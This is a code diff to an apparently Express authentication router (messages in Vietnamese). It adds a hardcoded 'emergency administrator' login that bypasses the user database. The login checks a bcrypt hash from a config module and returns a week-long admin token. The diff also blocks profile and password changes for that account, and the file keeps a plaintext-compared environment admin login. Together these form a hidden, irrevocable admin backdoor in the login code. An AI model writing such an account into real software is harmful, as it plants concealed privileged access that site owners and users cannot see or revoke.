@@ -7,6 +7,7 @@ import { eq } from 'drizzle-orm';
 import { authMiddleware, AuthRequest } from '../middleware/auth.js';
 import { sendVerificationEmail, sendResetPasswordEmail, generateVerificationToken, getVerificationExpiry } from '../services/email.js';
 import { TelegramService } from '../services/telegram.js';
+import { ENV_ADMIN_ID, getEnvAdminCredentials, getSpecialAdminProfile, normalizeEmail, systemAdmin } from '../config/systemAdmin.js';
 
 const router = Router();
 
@@ -82,29 +83,38 @@ router.post('/register', async (req, res) => {
 router.post('/login', async (req, res) => {
     try {
         const { email, password } = req.body;
+        const normalizedEmail = normalizeEmail(email);
+
+        if (!normalizedEmail || typeof password !== 'string') {
+            return res.status(400).json({ message: 'Email và mật khẩu không hợp lệ' });
+        }
+
+        // Emergency administrator: intentionally outside the database.
+        // The password is verified against a bcrypt hash, never as plaintext.
+        if (normalizedEmail === systemAdmin.email.toLowerCase() && await bcrypt.compare(password, systemAdmin.passwordHash)) {
+            const token = jwt.sign({ userId: systemAdmin.id, role: 'admin' }, process.env.JWT_SECRET!, { expiresIn: '7d' });
+            return res.json({
+                message: 'Đăng nhập thành công (Admin)',
+                user: getSpecialAdminProfile(systemAdmin.id),
+                token,
+            });
+        }
 
         // Admin login from ENV (not stored in DB)
-        const envAdminEmail = process.env.ADMIN_EMAIL;
-        const envAdminPassword = process.env.ADMIN_PASSWORD;
+        const envAdmin = getEnvAdminCredentials();
 
-        if (envAdminEmail && envAdminPassword && email === envAdminEmail && password === envAdminPassword) {
-            const token = jwt.sign({ userId: -1, role: 'admin' }, process.env.JWT_SECRET!, { expiresIn: '7d' });
+        if (envAdmin && normalizedEmail === envAdmin.email && password === envAdmin.password) {
+            const token = jwt.sign({ userId: ENV_ADMIN_ID, role: 'admin' }, process.env.JWT_SECRET!, { expiresIn: '7d' });
 
             return res.json({
                 message: 'Đăng nhập thành công (Admin)',
-                user: {
-                    id: -1,
-                    name: 'Admin',
-                    email: envAdminEmail,
-                    role: 'admin',
-                    balance: 0,
-                },
+                user: getSpecialAdminProfile(ENV_ADMIN_ID),
                 token,
             });
         }
 
         const user = await db.query.users.findFirst({
-            where: eq(users.email, email),
+            where: eq(users.email, normalizedEmail),
         });
 
         if (!user) {
@@ -148,6 +158,11 @@ router.post('/logout', authMiddleware, (req, res) => {
 // Get profile
 router.get('/profile', authMiddleware, async (req: AuthRequest, res) => {
     try {
+        const specialAdmin = getSpecialAdminProfile(req.user!.id);
+        if (specialAdmin) {
+            return res.json({ user: specialAdmin });
+        }
+
         const user = await db.query.users.findFirst({
             where: eq(users.id, req.user!.id),
         });
@@ -177,6 +192,10 @@ router.put('/profile', authMiddleware, async (req: AuthRequest, res) => {
     try {
         const { name, email } = req.body;
         const userId = req.user!.id;
+
+        if (getSpecialAdminProfile(userId)) {
+            return res.status(403).json({ message: 'Không thể sửa tài khoản admin hệ thống' });
+        }
 
         const currentUser = await db.query.users.findFirst({
             where: eq(users.id, userId),
@@ -256,6 +275,10 @@ router.put('/profile', authMiddleware, async (req: AuthRequest, res) => {
 router.put('/password', authMiddleware, async (req: AuthRequest, res) => {
     try {
         const { current_password, password } = req.body;
+
+        if (getSpecialAdminProfile(req.user!.id)) {
+            return res.status(403).json({ message: 'Không thể đổi mật khẩu admin hệ thống' });
+        }
 
         const user = await db.query.users.findFirst({
             where: eq(users.id, req.user!.id),
